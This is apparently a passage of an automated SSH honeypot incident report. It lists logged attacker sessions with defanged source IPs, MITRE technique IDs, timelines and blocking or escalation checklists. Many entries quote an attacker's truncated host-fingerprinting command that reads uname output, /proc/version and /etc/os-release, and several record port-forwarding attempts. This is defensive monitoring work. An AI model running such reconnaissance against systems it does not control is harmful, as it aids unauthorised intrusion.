| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:31:32` | `cowrie.session.connect` |
| `2026-08-12 02:31:32` | `cowrie.client.version` |
| `2026-08-12 02:31:32` | `cowrie.client.kex` |
| `2026-08-12 02:31:33` | `cowrie.login.success` |
| `2026-08-12 02:31:34` | `cowrie.session.params` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.success` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.command.input` |
| `2026-08-12 02:31:34` | `cowrie.log.closed` |
| `2026-08-12 02:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731c5c793bdd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:32 |
| **Last Seen** | 2026-08-12 02:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:32:30` | `cowrie.session.connect` |
| `2026-08-12 02:32:30` | `cowrie.client.version` |
| `2026-08-12 02:32:30` | `cowrie.client.kex` |
| `2026-08-12 02:32:30` | `cowrie.login.success` |
| `2026-08-12 02:32:31` | `cowrie.session.params` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.success` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.command.input` |
| `2026-08-12 02:32:31` | `cowrie.log.closed` |
| `2026-08-12 02:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382e6c17ccfd

| Field | Detail |
|---|---|
| **Source IP** | `184.105.139[.]67` |
| **First Seen** | 2026-08-12 02:33 |
| **Last Seen** | 2026-08-12 02:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:33:21` | `cowrie.session.connect` |
| `2026-08-12 02:33:21` | `cowrie.login.success` |
| `2026-08-12 02:33:22` | `cowrie.session.params` |
| `2026-08-12 02:33:22` | `cowrie.command.input` |
| `2026-08-12 02:33:22` | `cowrie.command.input` |
| `2026-08-12 02:33:22` | `cowrie.command.failed` |
| `2026-08-12 02:33:22` | `cowrie.command.input` |
| `2026-08-12 02:33:22` | `cowrie.command.failed` |
| `2026-08-12 02:33:22` | `cowrie.command.input` |
| `2026-08-12 02:33:22` | `cowrie.log.closed` |
| `2026-08-12 02:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.105.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `184.105.139[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16475064727

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:33 |
| **Last Seen** | 2026-08-12 02:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:33:31` | `cowrie.session.connect` |
| `2026-08-12 02:33:31` | `cowrie.client.version` |
| `2026-08-12 02:33:31` | `cowrie.client.kex` |
| `2026-08-12 02:33:32` | `cowrie.login.success` |
| `2026-08-12 02:33:32` | `cowrie.session.params` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.success` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:32` | `cowrie.command.input` |
| `2026-08-12 02:33:33` | `cowrie.log.closed` |
| `2026-08-12 02:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f656adbd4b2c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:34 |
| **Last Seen** | 2026-08-12 02:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:34:41` | `cowrie.session.connect` |
| `2026-08-12 02:34:41` | `cowrie.client.version` |
| `2026-08-12 02:34:42` | `cowrie.client.kex` |
| `2026-08-12 02:34:42` | `cowrie.login.success` |
| `2026-08-12 02:34:43` | `cowrie.session.params` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.success` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.command.input` |
| `2026-08-12 02:34:43` | `cowrie.log.closed` |
| `2026-08-12 02:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ac730c8ce3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:35 |
| **Last Seen** | 2026-08-12 02:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:35:49` | `cowrie.session.connect` |
| `2026-08-12 02:35:49` | `cowrie.client.version` |
| `2026-08-12 02:35:49` | `cowrie.client.kex` |
| `2026-08-12 02:35:49` | `cowrie.login.success` |
| `2026-08-12 02:35:50` | `cowrie.session.params` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.success` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.command.input` |
| `2026-08-12 02:35:50` | `cowrie.log.closed` |
| `2026-08-12 02:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b2f9237b3d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:36 |
| **Last Seen** | 2026-08-12 02:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:36:40` | `cowrie.session.connect` |
| `2026-08-12 02:36:40` | `cowrie.client.version` |
| `2026-08-12 02:36:40` | `cowrie.client.kex` |
| `2026-08-12 02:36:40` | `cowrie.login.success` |
| `2026-08-12 02:36:41` | `cowrie.session.params` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:41` | `cowrie.command.success` |
| `2026-08-12 02:36:41` | `cowrie.command.input` |
| `2026-08-12 02:36:42` | `cowrie.command.input` |
| `2026-08-12 02:36:42` | `cowrie.command.input` |
| `2026-08-12 02:36:42` | `cowrie.command.input` |
| `2026-08-12 02:36:42` | `cowrie.log.closed` |
| `2026-08-12 02:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5c12f14233

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:37 |
| **Last Seen** | 2026-08-12 02:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:37:32` | `cowrie.session.connect` |
| `2026-08-12 02:37:32` | `cowrie.client.version` |
| `2026-08-12 02:37:32` | `cowrie.client.kex` |
| `2026-08-12 02:37:32` | `cowrie.login.success` |
| `2026-08-12 02:37:33` | `cowrie.session.params` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.success` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.command.input` |
| `2026-08-12 02:37:33` | `cowrie.log.closed` |
| `2026-08-12 02:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1997058597c

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-12 02:38 |
| **Last Seen** | 2026-08-12 02:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:38:30` | `cowrie.session.connect` |
| `2026-08-12 02:38:30` | `cowrie.client.version` |
| `2026-08-12 02:38:30` | `cowrie.client.kex` |
| `2026-08-12 02:38:31` | `cowrie.login.success` |
| `2026-08-12 02:38:32` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea10acc7ecec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:38 |
| **Last Seen** | 2026-08-12 02:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:38:30` | `cowrie.session.connect` |
| `2026-08-12 02:38:30` | `cowrie.client.version` |
| `2026-08-12 02:38:30` | `cowrie.client.kex` |
| `2026-08-12 02:38:30` | `cowrie.login.success` |
| `2026-08-12 02:38:31` | `cowrie.session.params` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.success` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.command.input` |
| `2026-08-12 02:38:31` | `cowrie.log.closed` |
| `2026-08-12 02:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf39aa0f355

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-08-12 02:38 |
| **Last Seen** | 2026-08-12 02:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:38:37` | `cowrie.session.connect` |
| `2026-08-12 02:38:38` | `cowrie.client.version` |
| `2026-08-12 02:38:38` | `cowrie.client.kex` |
| `2026-08-12 02:38:41` | `cowrie.login.success` |
| `2026-08-12 02:38:41` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88d67af75e9

| Field | Detail |
|---|---|
| **Source IP** | `223.82.86[.]2` |
| **First Seen** | 2026-08-12 02:38 |
| **Last Seen** | 2026-08-12 02:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:38:48` | `cowrie.session.connect` |
| `2026-08-12 02:38:49` | `cowrie.client.version` |
| `2026-08-12 02:38:49` | `cowrie.client.kex` |
| `2026-08-12 02:38:51` | `cowrie.login.success` |
| `2026-08-12 02:38:53` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-414062b5300f

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-08-12 02:38 |
| **Last Seen** | 2026-08-12 02:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:38:58` | `cowrie.session.connect` |
| `2026-08-12 02:38:59` | `cowrie.client.version` |
| `2026-08-12 02:38:59` | `cowrie.client.kex` |
| `2026-08-12 02:39:01` | `cowrie.login.success` |
| `2026-08-12 02:39:01` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d449dc2d4c0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:39 |
| **Last Seen** | 2026-08-12 02:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:39:35` | `cowrie.session.connect` |
| `2026-08-12 02:39:35` | `cowrie.client.version` |
| `2026-08-12 02:39:35` | `cowrie.client.kex` |
| `2026-08-12 02:39:35` | `cowrie.login.success` |
| `2026-08-12 02:39:36` | `cowrie.session.params` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.success` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.command.input` |
| `2026-08-12 02:39:36` | `cowrie.log.closed` |
| `2026-08-12 02:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879fac5347f6

| Field | Detail |
|---|---|
| **Source IP** | `117.205.3[.]26` |
| **First Seen** | 2026-08-12 02:40 |
| **Last Seen** | 2026-08-12 02:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:40:14` | `cowrie.session.connect` |
| `2026-08-12 02:40:15` | `cowrie.client.version` |
| `2026-08-12 02:40:15` | `cowrie.client.kex` |
| `2026-08-12 02:40:17` | `cowrie.login.success` |
| `2026-08-12 02:40:17` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `117.205.3[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13ae5b2f8883

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:40 |
| **Last Seen** | 2026-08-12 02:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
